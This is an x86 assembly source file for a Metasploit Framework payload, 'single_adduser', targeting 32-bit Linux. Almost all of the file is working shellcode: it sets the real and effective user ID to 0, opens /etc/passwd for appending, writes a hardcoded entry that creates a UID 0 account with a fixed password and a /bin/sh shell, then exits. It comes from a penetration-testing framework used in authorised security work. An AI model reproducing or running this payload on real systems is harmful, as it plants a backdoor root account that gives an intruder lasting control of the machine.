;;
;
;        Name: single_adduser
;     Authors: vlad902 <vlad902 [at] gmail.com>
;     Authors: spoonm <ninjatools [at] hush.com>
;     Authors: skape <mmiller [at] hick.org>
;     Version: $Revision: 1513 $
;     License:
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Add a line to /etc/passwd.
;
; Meta-Information:
;
; meta-shortname=Linux adduser
; meta-description=Create an entry in /etc/passwd with UID=0
; meta-authors=vlad902 <vlad902 [at] gmail.com>, spoonm <ninjatools [at] hush.com>, skape <mmiller [at] hick.org>
; meta-os=linux
; meta-arch=ia32
; meta-category=single
; meta-name=adduser
; meta-basemod=Msf::PayloadComponent::NoConnection
; Offset for inserting the string:
; meta-custom1=0x27
; Offset after string:
; meta-custom2=0x4b
;;


BITS 32
global _start

%include "generic.asm"

_start:
  setreuid 0

  push  byte 0x05
  pop   eax

  xor   ecx, ecx
  push  ecx
  push  dword 0x64777373
  push  dword 0x61702f2f
  push  dword 0x6374652f
  mov   ebx, esp
  inc   ecx
  mov   ch, 0x04
  int   0x80

  xchg  eax, ebx
  call  getstr
db "ABC:AAnV3m35vbc/g:0:0::/:/bin/sh"
getstr:
  pop   ecx
  mov   edx, [ecx-4]
  push  byte 0x04
  pop   eax
  int   0x80

  push  byte 0x01
  pop   eax
  int   0x80
